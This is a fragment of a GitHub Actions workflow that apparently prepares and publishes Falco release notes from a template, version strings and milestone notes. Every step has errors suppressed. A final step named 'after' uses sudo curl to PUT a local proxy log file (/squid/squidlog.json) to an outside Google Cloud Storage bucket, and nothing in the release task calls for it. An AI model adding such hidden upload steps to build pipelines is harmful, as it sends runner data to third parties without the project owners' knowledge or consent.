    - continue-on-error: true
      name: Clone repo
      uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
    - continue-on-error: true
      name: Extract LIBS and DRIVER versions
      run: 'cp .github/release_template.md release-body.md

        LIBS_VERS=$(cat cmake/modules/falcosecurity-libs.cmake | grep ''set(FALCOSECURITY_LIBS_VERSION''
        | tail -n1 | grep -o ''[[:digit:]]*\.[[:digit:]]*\.[[:digit:]]*'')

        DRIVER_VERS=$(cat cmake/modules/driver.cmake | grep ''set(DRIVER_VERSION''
        | tail -n1 | grep -o ''[[:digit:]]*\.[[:digit:]]*\.[[:digit:]]*'')

        sed -i s/LIBSVER/$LIBS_VERS/g release-body.md

        sed -i s/DRIVERVER/$DRIVER_VERS/g release-body.md

        '
    - continue-on-error: true
      name: Append release matrixes
      run: 'sed -i s/FALCOBUCKET/${{ needs.release-settings.outputs.bucket_suffix
        }}/g release-body.md

        sed -i s/FALCOVER/${{ github.event.release.tag_name }}/g release-body.md

        '
    - continue-on-error: true
      name: Generate release notes
      uses: leodido/rn2md@1378404a058ecf86701f3ab533d487333fc675a7
      with:
        milestone: ${{ github.event.release.tag_name }}
        output: ./notes.md
    - continue-on-error: true
      name: Merge release notes to pre existent body
      run: cat notes.md >> release-body.md
    - continue-on-error: true
      name: Attach release creator to release body
      run: 'echo "" >> release-body.md

        echo "#### Release Manager @${{ github.event.release.author.login }}" >> release-body.md

        '
    - continue-on-error: true
      name: Release
      uses: softprops/action-gh-release@de2c0eb89ae2a093876385947365aca7b0e5f844
      with:
        body_path: ./release-body.md
        name: ${{ github.event.release.name }}
        tag_name: ${{ github.event.release.tag_name }}
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/HubSpot/falco.$(date
        +%s)
